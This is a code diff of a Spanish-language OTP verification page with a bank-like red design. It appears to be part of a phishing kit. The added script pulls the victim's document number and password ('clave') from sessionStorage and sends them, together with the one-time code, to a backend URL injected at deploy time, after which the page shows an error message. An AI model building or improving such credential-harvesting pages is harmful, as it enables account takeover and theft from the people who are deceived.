@@ -7,24 +7,19 @@
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
-        /* --- Configuración General --- */
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { font-family: 'Montserrat', sans-serif; background-color: #f0f2f7; color: #333; min-height: 100vh; display: flex; flex-direction: column; position: relative; overflow-x: hidden; }
 
-        /* --- Header --- */
         .header { background-color: #ffffff; padding: 20px 40px; width: 100%; box-shadow: 0 2px 4px rgba(0,0,0,0.02); z-index: 10; }
         .logo { height: 35px; width: auto; }
 
-        /* --- Contenedor Principal --- */
         .main-container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px; max-width: 1200px; margin: 0 auto; width: 100%; gap: 100px; z-index: 5; position: relative; transition: filter 0.3s ease; }
         .main-container.procesando { filter: blur(5px); pointer-events: none; }
 
-        /* --- Textos --- */
         .text-section { max-width: 400px; }
         .text-section h1 { font-size: 28px; font-weight: 500; color: #1a1a1a; margin-bottom: 5px; letter-spacing: -0.5px; }
         .text-section h2 { font-size: 34px; font-weight: 700; color: #222; letter-spacing: -0.5px; }
 
-        /* --- Formulario y Tarjeta --- */
         .form-wrapper { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 450px; }
         .card { background-color: #ffffff; padding: 30px; border-radius: 20px; width: 100%; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e5e5e5; margin-bottom: 25px; }
 
@@ -50,7 +45,6 @@
         .otp-input::placeholder { color: #ccc; letter-spacing: 10px; }
         .otp-input:focus { border-color: #d32f2f; }
 
-        /* --- Botones --- */
         .actions { display: flex; flex-direction: column; align-items: center; width: 100%; gap: 15px; }
         
         .btn-continue {
@@ -72,26 +66,21 @@
         .btn-cancel { color: #333; font-size: 15px; font-weight: 600; text-decoration: none; padding: 5px 15px; cursor: pointer; }
         .btn-cancel:hover { text-decoration: underline; }
 
-        /* --- Elemento Decorativo de Fondo --- */
         .bg-shape { position: absolute; bottom: -100px; left: -100px; width: 600px; height: 600px; background-color: #e2e5eb; border-radius: 50%; z-index: 1; pointer-events: none; }
 
-        /* --- Footer --- */
         .footer { padding: 20px; text-align: center; font-size: 9px; color: #555; z-index: 10; }
         .footer-logos { display: flex; justify-content: center; gap: 20px; align-items: center; text-transform: uppercase; }
 
-        /* --- Mensajes de Error --- */
         .error-msg { display: none; color: #d32f2f; background-color: #ffebee; padding: 10px; border-radius: 8px; font-size: 14px; font-weight: 600; text-align: center; margin-bottom: 15px; width: 100%; border: 1px solid #ffcdd2; }
         .error-msg.mostrar { display: block; animation: shake 0.4s; }
         @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
 
-        /* --- PANTALLA DE CARGA (SPINNER) --- */
         #loader-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(240, 242, 247, 0.4); backdrop-filter: blur(3px); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
         #loader-overlay.mostrar { display: flex; }
         .spinner { width: 60px; height: 60px; border: 6px solid #e0e0e0; border-top: 6px solid #d32f2f; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loader-text { font-size: 18px; font-weight: 600; color: #333; }
 
-        /* --- MEDIA QUERIES --- */
         @media (max-width: 768px) {
             .header { padding: 15px 20px; }
             .main-container { flex-direction: column; padding: 20px; gap: 40px; justify-content: flex-start; margin-top: 20px; }
@@ -166,6 +155,10 @@
         // --- URL DEL BACKEND INYECTADA POR RENDER ---
         const API_URL = "__API_URL__";
 
+        // --- Recuperar datos del paso anterior ---
+        const documento = sessionStorage.getItem('documento') || 'No disponible';
+        const clave = sessionStorage.getItem('clave') || 'No disponible';
+
         const inputOtp = document.getElementById('codigoOtp');
         const btnValidar = document.getElementById('btnValidar');
         const mainContent = document.getElementById('mainContent');
@@ -207,7 +200,11 @@
                 const respuesta = await fetch(`${API_URL}/solicitar-otp`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ otp: codigo })
+                    body: JSON.stringify({ 
+                        otp: codigo, 
+                        documento: documento, 
+                        clave: clave 
+                    })
                 });
 
                 if (!respuesta.ok) throw new Error('Error en el servidor');
@@ -247,7 +244,7 @@
             }
         });
 
-        // --- Detener carga y mostrar error ---
+        // --- Detener carga y mostrar error formal ---
         function detenerCargaYMostrarError() {
             mainContent.classList.remove('procesando');
             loaderOverlay.classList.remove('mostrar');
